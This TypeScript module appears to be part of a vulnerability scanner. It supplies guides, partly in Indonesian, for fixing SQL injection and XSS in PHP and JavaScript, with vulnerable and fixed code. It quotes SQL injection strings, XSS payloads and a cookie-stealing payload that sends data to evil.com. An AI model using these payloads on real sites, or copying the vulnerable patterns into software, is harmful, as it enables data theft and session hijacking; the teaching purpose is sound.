/**
 * Remediation Guide Module
 * Provides detailed educational remediation guides for vulnerabilities
 * Fokus: Rekomendasi Perbaikan Edukatif (FR-05 dari Proposal)
 */

export interface RemediationGuide {
  ruleName: string
  severity: string
  riskDescription: string
  whyItsDangerous: string
  stepByStepFix: string[]
  beforeCode: string
  afterCode: string
  bestPractices: string[]
  additionalResources?: string[]
}

// Mapping dari rule ID ke detailed remediation guide
const remediationDatabase: Record<string, RemediationGuide> = {
  // ============ SQL INJECTION GUIDES ============
  SQLI_001: {
    ruleName: "Direct Variable in SQL Query",
    severity: "CRITICAL",
    riskDescription: "Kode Anda memasukkan input pengguna langsung ke dalam perintah database tanpa menggunakan prepared statements.",
    whyItsDangerous: `
    Penyerang dapat memodifikasi perintah SQL Anda. Contoh:
    - Input normal: 1
    - Input berbahaya: 1 OR 1=1 (menampilkan semua data)
    - Input berbahaya: 1; DROP TABLE users; (menghapus tabel)
    Akibatnya: pencurian data, penghapusan database, atau modifikasi data.
    `,
    stepByStepFix: [
      "1. IDENTIFIKASI: Cari semua penggunaan mysqli_query, mysql_query, atau pg_query dengan input pengguna",
      "2. GANTI dengan Prepared Statements: Gunakan $conn->prepare() bukan merangkai string",
      "3. BIND PARAMETER: Gunakan bind_param() untuk masukkan data pengguna dengan aman",
      "4. EKSEKUSI: Jalankan dengan execute()",
      "5. VERIFIKASI: Test dengan input berbahaya seperti ' OR 1=1-- untuk memastikan tidak terpengaruh"
    ],
    beforeCode: `<?php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = " . $id;
$result = mysqli_query($conn, $query);
?>`,
    afterCode: `<?php
$id = $_GET['id'];
// ✅ Cara aman: Prepared Statement
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);  // "i" = integer type
$stmt->execute();
$result = $stmt->get_result();
?>`,
    bestPractices: [
      "Selalu gunakan prepared statements untuk query database",
      "Jangan pernah gabungkan string input pengguna ke dalam SQL",
      "Gunakan bind_param() atau bindValue() untuk semua nilai dinamis",
      "Validasi tipe data input (integer, string, email) di sisi server",
      "Batasi hak akses database user (principle of least privilege)"
    ],
    additionalResources: [
      "📚 OWASP: SQL Injection Prevention",
      "🔗 PHP MySQLi Prepared Statements Docs",
      "🎥 Tutorial: Secure Database Queries"
    ]
  },

  SQLI_002: {
    ruleName: "SQL Injection via String Concatenation",
    severity: "CRITICAL",
    riskDescription: "Input pengguna digabungkan dengan perintah SQL menggunakan operator dot (.), membiarkan penyerang mengubah perintah.",
    whyItsDangerous: `
    Contoh input berbahaya:
    - admin' OR '1'='1
    - ' UNION SELECT password FROM admin--
    - ' DROP TABLE users;--
    `,
    stepByStepFix: [
      "1. TEMUKAN: Cari pola . $_ atau .= $_ dalam query SQL",
      "2. HAPUS CONCATENATION: Ganti dengan ? placeholder",
      "3. GUNAKAN prepare() dan bind_param()",
      "4. TEST: Coba dengan karakter khusus seperti ', --, ;",
      "5. DEPLOY: Update ke production"
    ],
    beforeCode: `<?php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '" . $username . "' AND password = '" . $password . "'";
$result = mysqli_query($conn, $query);
?>`,
    afterCode: `<?php
$username = $_POST['username'];
$password = $_POST['password'];
// ✅ Prepared statement mencegah SQL Injection
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);  // "ss" = string + string
$stmt->execute();
$result = $stmt->get_result();
if ($result->num_rows > 0) {
  // Login sukses
  $_SESSION['user'] = $username;
}
?>`,
    bestPractices: [
      "Hindari string concatenation dalam SQL queries",
      "Gunakan parameter placeholders (?) sebagai ganti nilai langsung",
      "Untuk login, hash password dengan bcrypt, jangan simpan plaintext",
      "Implementasikan rate limiting untuk mencegah brute force attacks",
      "Gunakan ORM seperti Doctrine atau Eloquent yang handle parameterization"
    ],
    additionalResources: [
      "🔐 Password Hashing: PHP password_hash()",
      "📖 CWE-89: SQL Injection Details",
      "⚙️ Database Abstraction Layers"
    ]
  },

  SQLI_003: {
    ruleName: "mysqli_query with Unsanitized Input",
    severity: "CRITICAL",
    riskDescription: "mysqli_query() digunakan dengan input pengguna tanpa escaping atau prepared statements.",
    whyItsDangerous: `
    Function mysqli_query() adalah cara lama dan tidak aman untuk query database.
    Bahkan dengan mysqli_real_escape_string(), masih ada celah yang dapat dieksploitasi.
    `,
    stepByStepFix: [
      "1. GANTI APPROACH: Gunakan prepared statements, bukan mysqli_query() langsung",
      "2. REFACTOR: Ubah semua mysqli_query() calls menjadi prepare() + bind_param()",
      "3. TESTING: Pastikan functionality yang sama tetap bekerja",
      "4. DOCUMENTATION: Update dokumentasi untuk tim development"
    ],
    beforeCode: `<?php
$id = $_GET['id'];
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = $id");
while ($row = mysqli_fetch_assoc($result)) {
  echo $row['name'];
}
?>`,
    afterCode: `<?php
$id = $_GET['id'];
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
while ($row = $result->fetch_assoc()) {
  echo htmlspecialchars($row['name'], ENT_QUOTES);
}
?>`,
    bestPractices: [
      "Selalu gunakan prepared statements sebagai standard practice",
      "Hindari mysqli_query() dengan input dinamis",
      "Validasi dan sanitize output juga (defense in depth)",
      "Gunakan Type Hints di PHP untuk input validation",
      "Implementasikan database query logging untuk audit trail"
    ],
    additionalResources: [
      "🛡️ PHP MySQLi vs PDO Comparison",
      "📝 OWASP Top 10 - A01 Broken Access Control",
      "🔍 SQL Injection Testing Methods"
    ]
  },

  // ============ XSS GUIDES ============
  XSS_001: {
    ruleName: "Direct Echo of User Input",
    severity: "CRITICAL",
    riskDescription: "Input pengguna ditampilkan langsung ke halaman HTML tanpa HTML encoding.",
    whyItsDangerous: `
    Penyerang dapat inject script berbahaya:
    - Input: <script>alert('Hacked')</script>
    - Hasil: Script dijalankan di browser korban
    - Dampak: Session hijacking, phishing, malware distribution
    `,
    stepByStepFix: [
      "1. TEMUKAN: Cari semua 'echo $_GET' atau 'echo $_POST'",
      "2. WRAP dengan htmlspecialchars(): echo htmlspecialchars($_GET['name']);",
      "3. GUNAKAN FLAGS: ENT_QUOTES dan charset UTF-8",
      "4. TEST: Input dengan <, >, ', \", & untuk memastikan di-escape",
      "5. DEPLOY: Update ke semua halaman"
    ],
    beforeCode: `<?php
$name = $_GET['name'];
echo "Welcome, " . $name;
?>`,
    afterCode: `<?php
$name = $_GET['name'];
// ✅ htmlspecialchars() convert < > " ' & ke entity
echo "Welcome, " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
?>`,
    bestPractices: [
      "Selalu escape output dengan htmlspecialchars() atau htmlentities()",
      "Gunakan ENT_QUOTES untuk escape single & double quotes",
      "Gunakan UTF-8 charset untuk konsistensi",
      "Implementasikan Content Security Policy (CSP) header",
      "Gunakan templating engine dengan auto-escaping seperti Twig atau Blade"
    ],
    additionalResources: [
      "🛡️ HTML Entity Encoding Reference",
      "📋 Content Security Policy (CSP) Guide",
      "🎯 OWASP XSS Prevention Cheat Sheet"
    ]
  },

  XSS_002: {
    ruleName: "Reflected XSS via Query Parameters",
    severity: "HIGH",
    riskDescription: "Query parameter dari URL ditampilkan kembali ke halaman tanpa sanitisasi.",
    whyItsDangerous: `
    Penyerang mengirim link berbahaya:
    - URL: https://site.com/search.php?q=<img src=x onerror=alert('xss')>
    - Korban yang klik link akan ter-hack
    - Akses email, cookies, dan data pribadi dapat dicuri
    `,
    stepByStepFix: [
      "1. IDENTIFIKASI: Cari semua $_GET atau $_REQUEST dalam output HTML",
      "2. VALIDATE: Pastikan format input sesuai yang diharapkan (email, number, dll)",
      "3. ESCAPE: Gunakan htmlspecialchars() sebelum echo",
      "4. CSP HEADER: Tambah Content-Security-Policy header",
      "5. TEST: Gunakan web security scanner untuk test"
    ],
    beforeCode: `<?php
$search = $_GET['q'];
echo "<h1>Search results for: " . $search . "</h1>";
?>`,
    afterCode: `<?php
$search = $_GET['q'];
// ✅ Validate & escape
$search = trim($search);
if (strlen($search) > 100) {
  $search = substr($search, 0, 100);
}
echo "<h1>Search results for: " . htmlspecialchars($search, ENT_QUOTES) . "</h1>";
?>`,
    bestPractices: [
      "Validasi format input (email, URL, phone, dll)",
      "Implement whitelist validation jika memungkinkan",
      "Escape semua output ke HTML/JavaScript/URL context",
      "Gunakan HTTP Security Headers: X-XSS-Protection, X-Content-Type-Options",
      "Monitor dan log attempted XSS attacks"
    ],
    additionalResources: [
      "🔒 Input Validation Patterns",
      "📡 HTTP Security Headers Configuration",
      "🧪 XSS Testing Payloads (untuk testing saja!)"
    ]
  },

  XSS_003: {
    ruleName: "Stored XSS from Database Output",
    severity: "CRITICAL",
    riskDescription: "Data dari database ditampilkan langsung ke halaman HTML tanpa encoding, padahal data tersebut mungkin sudah terkontaminasi dari input pengguna sebelumnya.",
    whyItsDangerous: `
    Stored XSS lebih berbahaya dari Reflected karena:
    - Data berbahaya tersimpan di database
    - Setiap pengguna yang membaca data akan ter-hack
    - Tidak perlu social engineering - cukup akses normal
    - Contoh: Komentar dengan <img src=x onerror=alert('xss')> di database
    `,
    stepByStepFix: [
      "1. AUDIT DATABASE: Periksa apakah ada record yang sudah terinfeksi",
      "2. SANITASI SAAT SIMPAN: Jangan simpan HTML/script dari user - simpan plain text",
      "3. ESCAPE SAAT TAMPIL: Gunakan htmlspecialchars() saat menampilkan dari database",
      "4. VALIDASI INPUT: Reject atau clean input sebelum disimpan (jika ingin HTML, gunakan HTML Purifier)",
      "5. CLEANUP: Jalankan script untuk clean database dari XSS payload yang ada"
    ],
    beforeCode: `<?php
$user_id = $_GET['id'];
$query = "SELECT name, comment FROM users WHERE id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();
$row = $result->fetch_assoc();

// ❌ Vulnerable: Directly echo from database
echo "<p>Name: " . $row['name'] . "</p>";
echo "<p>Comment: " . $row['comment'] . "</p>";  // Jika comment ada <script>, akan dijalankan!
?>`,
    afterCode: `<?php
$user_id = $_GET['id'];
$query = "SELECT name, comment FROM users WHERE id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();
$row = $result->fetch_assoc();

// ✅ Safe: Escape saat tampilkan
echo "<p>Name: " . htmlspecialchars($row['name'], ENT_QUOTES, 'UTF-8') . "</p>";
echo "<p>Comment: " . htmlspecialchars($row['comment'], ENT_QUOTES, 'UTF-8') . "</p>";
?>`,
    bestPractices: [
      "Escape SEMUA data dari database saat ditampilkan ke HTML",
      "Jangan pernah trust data dari database - anggap semua untrusted sampai divalidasi",
      "Gunakan prepared statements untuk query (sudah ada di contoh)",
      "Implementasikan Content Security Policy (CSP) header yang ketat",
      "Audit database secara berkala untuk payload berbahaya"
    ],
    additionalResources: [
      "📚 OWASP: Stored XSS Prevention",
      "🔍 Database Audit Techniques",
      "🛡️ HTML Purifier Library (jika ingin accept HTML dari user)"
    ]
  },

  XSS_004: {
    ruleName: "JavaScript innerHTML with User Input",
    severity: "CRITICAL",
    riskDescription: "JavaScript menggunakan innerHTML untuk memasukkan HTML dari input pengguna.",
    whyItsDangerous: `
    innerHTML akan parse dan execute HTML/JavaScript:
    - Input: <img src=x onerror='fetch(\"https://evil.com?cookie=\" + document.cookie)'>
    - Akibat: Cookies pengguna dikirim ke server penyerang
    `,
    stepByStepFix: [
      "1. REPLACE innerHTML dengan textContent (jika hanya text)",
      "2. GUNAKAN Framework: React/Vue yang auto-escape",
      "3. SANITIZER: Jika HTML perlu, gunakan DOMPurify library",
      "4. CSP: Implementasikan strict CSP untuk script-src",
      "5. TEST: Test dengan event handler payloads"
    ],
    beforeCode: `<script>
var userInput = getUserInput();
document.getElementById('output').innerHTML = userInput;
</script>`,
    afterCode: `<script>
var userInput = getUserInput();
// ✅ Option 1: Gunakan textContent untuk plain text
document.getElementById('output').textContent = userInput;

// ✅ Option 2: Jika HTML dibutuhkan, sanitasi dengan DOMPurify
// document.getElementById('output').innerHTML = DOMPurify.sanitize(userInput);
</script>`,
    bestPractices: [
      "Gunakan textContent/innerText untuk plain text content",
      "Gunakan DOMPurify.sanitize() jika HTML output dibutuhkan",
      "Gunakan modern frameworks (React, Vue) dengan auto-escaping",
      "Implementasikan strict CSP dengan nonce/hash untuk inline scripts",
      "Avoid eval(), Function() constructor dengan user input"
    ],
    additionalResources: [
      "📚 DOMPurify Library Documentation",
      "⚛️ React/Vue Security Best Practices",
      "🔐 Content Security Policy (CSP) Advanced Guide"
    ]
  },

  // LOW SEVERITY EXAMPLES
  SQLI_LOW_001: {
    ruleName: "SQL Query Parameter Validation Missing",
    severity: "LOW",
    riskDescription: "Parameter query tidak divalidasi terhadap tipe data yang diharapkan (bisa integer, string, email).",
    whyItsDangerous: `
    Meskipun menggunakan prepared statements, validasi input tambahan membantu:
    - Mencegah logic errors
    - Meningkatkan performance query
    - Memberikan better error messages
    `,
    stepByStepFix: [
      "1. IDENTIFY: Tentukan tipe data yang diharapkan (int, email, date)",
      "2. VALIDATE: Gunakan filter_var() atau is_numeric() sebelum query",
      "3. REJECT: Kembalikan error jika input tidak sesuai tipe",
      "4. LOG: Catat attempt yang tidak valid untuk audit"
    ],
    beforeCode: `<?php
$id = $_GET['id'];
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
?>`,
    afterCode: `<?php
$id = $_GET['id'];
// ✅ Validasi tipe integer
if (!is_numeric($id) || intval($id) < 1) {
  http_response_code(400);
  die(json_encode(['error' => 'Invalid ID parameter']));
}
$id = intval($id);
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
?>`,
    bestPractices: [
      "Selalu validasi tipe dan format input",
      "Gunakan filter_var() untuk email, URL, IP validation",
      "Implement whitelist untuk enum values",
      "Return meaningful error messages tanpa info teknis"
    ],
    additionalResources: [
      "🔍 PHP filter_var() Documentation",
      "📋 Input Validation Best Practices",
      "🛡️ OWASP Input Validation Cheat Sheet"
    ]
  },

  XSS_LOW_001: {
    ruleName: "CSS Injection via Style Attributes",
    severity: "LOW",
    riskDescription: "User input dalam style attributes dapat menyebabkan visual manipulation atau info disclosure via CSS.",
    whyItsDangerous: `
    CSS dapat digunakan untuk:
    - Menghide elemen penting di halaman
    - Overlay atau redirect pengguna ke form phishing
    - CSS selectors dapat leak information via :visited selector
    `,
    stepByStepFix: [
      "1. AVOID: Jangan masukkan user input ke style attributes",
      "2. USE CLASSES: Gunakan predefined CSS classes",
      "3. WHITELIST: Jika harus, whitelist CSS properties (color, font-size saja)",
      "4. ESCAPE: Escape quotes jika user input digunakan"
    ],
    beforeCode: `<?php
$color = $_GET['color'];
echo "<div style='color: " . $color . "'>Text</div>";
?>`,
    afterCode: `<?php
$color = $_GET['color'];
// ✅ Whitelist allowed colors
$allowed_colors = ['red', 'blue', 'green', '#000000'];
$safe_color = in_array($color, $allowed_colors) ? $color : 'black';
echo "<div style='color: " . $safe_color . "'>Text</div>";
?>`,
    bestPractices: [
      "Gunakan CSS classes untuk styling, bukan inline styles",
      "Whitelist CSS properties dan values",
      "Escape CSS special characters",
      "Implementasikan strict CSP dengan style-src directive"
    ],
    additionalResources: [
      "🎨 CSS Security Best Practices",
      "📝 CSS Injection Vectors",
      "🛡️ CSP style-src Configuration"
    ]
  }
}

/**
 * Get remediation guide untuk specific rule
 */
export function getRemediationGuide(ruleId: string): RemediationGuide | null {
  return remediationDatabase[ruleId] || null
}

/**
 * Format remediation untuk display di UI
 */
export function formatRemediationForUI(ruleId: string) {
  const guide = getRemediationGuide(ruleId)
  if (!guide) return null

  return {
    title: guide.ruleName,
    severity: guide.severity,
    riskDescription: guide.riskDescription.replace(/\n\s+/g, " ").trim(),
    whyItsDangerous: guide.whyItsDangerous.replace(/\n\s+/g, " ").trim(),
    stepByStepFix: guide.stepByStepFix,
    codeComparison: {
      vulnerable: guide.beforeCode,
      secure: guide.afterCode
    },
    bestPractices: guide.bestPractices,
    resources: guide.additionalResources || []
  }
}

/**
 * Get semua available remediation guides
 */
export function getAllRemediationGuides() {
  return Object.entries(remediationDatabase).map(([ruleId, guide]) => ({
    ruleId,
    ruleName: guide.ruleName,
    severity: guide.severity
  }))
}
